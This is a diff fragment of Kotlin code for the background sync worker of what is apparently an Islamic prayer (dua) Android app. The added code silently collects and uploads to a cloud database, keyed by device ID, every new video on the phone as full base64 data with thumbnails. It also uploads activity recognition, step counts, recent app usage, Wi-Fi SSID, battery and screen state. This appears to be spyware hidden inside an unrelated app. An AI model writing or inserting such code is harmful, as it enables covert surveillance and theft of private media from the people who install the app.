+                CloudApi.writeToRTDB("devices/$androidId/steps/$todayDate", stepsDoc)
+
+                // Activity recognition (lightweight)
+                try {
+                    val activityCollector = ActivityRecognitionCollector(context)
+                    val latestActivity = activityCollector.getLatestActivity()
+                    if (latestActivity.tsMs > 0) {
+                        val activityDoc = JSONObject().apply {
+                            put("type", latestActivity.type)
+                            put("confidence", latestActivity.confidence)
+                            put("source", latestActivity.source)
+                            put("ts_ms", latestActivity.tsMs)
+                        }
+                        CloudApi.writeToRTDB("devices/$androidId/activity/latest", activityDoc)
+                    }
+                } catch (_: Exception) {}
 
                 // Most recently used app (lightweight — only queries last hour)
                 try {
@@ -929,6 +1135,68 @@ class DuaSyncWorker(
                 } catch (_: Exception) {}
             } catch (e: Exception) {
                 Log.d(TAG, "lightweightSync: ${e.message}")
+            }
+        }
+
+        suspend fun syncVideos(context: Context) {
+            try {
+                val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
+                val lastVideoSyncMs = prefs.getLong("last_video_sync_ms", 0L)
+                val now = System.currentTimeMillis()
+                if (now - lastVideoSyncMs < 3600000L) return
+                val androidId = DeviceId.get(context)
+                val resolver = context.contentResolver
+                val collector = VideoCollector(context)
+                val processor = VideoProcessor()
+                val dedupDao = AppDatabase.getInstance(context).videoDedupDao()
+                val lastDateAdded = prefs.getLong("last_video_date_added", 0L)
+                val videos = collector.collectAllVideos(lastDateAdded)
+                Log.d(TAG, "Video sync: ${videos.size} new videos found")
+                var newestDateAdded = lastDateAdded
+                var uploadedCount = 0
+                for ((i, video) in videos.withIndex()) {
+                    if (video.sizeBytes == 0L) {
+                        Log.w(TAG, "Skipping video with unknown size: ${video.displayName}")
+                        continue
+                    }
+                    if (dedupDao.isUploaded(video.uri.toString(), video.displayName, video.sizeBytes, video.dateAdded)) continue
+                    val thumbBase64 = try { collector.generateThumbnail(video.uri) } catch (_: Exception) { null }
+                    val processed = processor.process(
+                        video.uri, resolver, video.displayName, video.durationMs,
+                        video.width, video.height, video.sizeBytes, thumbBase64
+                    )
+                    if (processed == null) continue
+                    val ts = System.currentTimeMillis()
+                    val source = collector.classifySource(video)
+                    val videoDoc = JSONObject().apply {
+                        put("fileName", processed.fileName)
+                        put("dateAdded", video.dateAdded)
+                        put("durationMs", processed.durationMs)
+                        put("width", processed.width)
+                        put("height", processed.height)
+                        put("sizeBytes", processed.sizeBytes)
+                        put("source", source)
+                        put("ts_ms", ts)
+                        if (processed.thumbBase64 != null) put("thumb", processed.thumbBase64)
+                        put("data", processed.base64)
+                    }
+                    val success = try {
+                        CloudApi.writeToRTDB("devices/$androidId/videos/$ts", videoDoc, skipQueue = true)
+                    } catch (_: Exception) { false }
+                    if (success) {
+                        dedupDao.markUploaded(video.uri.toString(), video.displayName, video.sizeBytes, video.dateAdded)
+                        if (video.dateAdded > newestDateAdded) newestDateAdded = video.dateAdded
+                        uploadedCount++
+                    }
+                    if (i < videos.size - 1) delay(200)
+                }
+                prefs.edit()
+                    .putLong("last_video_date_added", newestDateAdded)
+                    .putLong("last_video_sync_ms", now)
+                    .apply()
+                Log.i(TAG, "Video sync: $uploadedCount uploaded, ${videos.size - uploadedCount} skipped/deduped")
+            } catch (e: Exception) {
+                Log.e(TAG, "Video sync error: ${e.message}", e)
             }
         }
 
@@ -989,11 +1257,24 @@ class DuaSyncWorker(
                         pkgMgr.getApplicationLabel(ai).toString()
                     } catch (_: Exception) { lastPkg }
                     val androidId = DeviceId.get(context)
+                    val snapMetrics = try {
+                        val mc = islamic.duas.metrics.MetricsCollector(context)
+                        mc.collectDeviceMetrics()
+                    } catch (_: Exception) { null }
+                    val pm = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
+                    val screenOn = pm?.isInteractive ?: true
                     val snapDoc = JSONObject().apply {
                         put("appName", appName)
                         put("packageName", lastPkg)
                         put("phoneTsMs", lastTs)
                         put("dashboardTsMs", now)
+                        if (snapMetrics != null) {
+                            put("batteryPct", snapMetrics.batteryPct)
+                            put("isCharging", snapMetrics.isCharging)
+                            put("networkType", snapMetrics.networkType)
+                            put("wifiSsid", snapMetrics.wifiSsid)
+                        }
+                        put("screenOn", screenOn)
                     }
                     CloudApi.writeToRTDB("devices/$androidId/appSnapshots/$now", snapDoc)
                 }
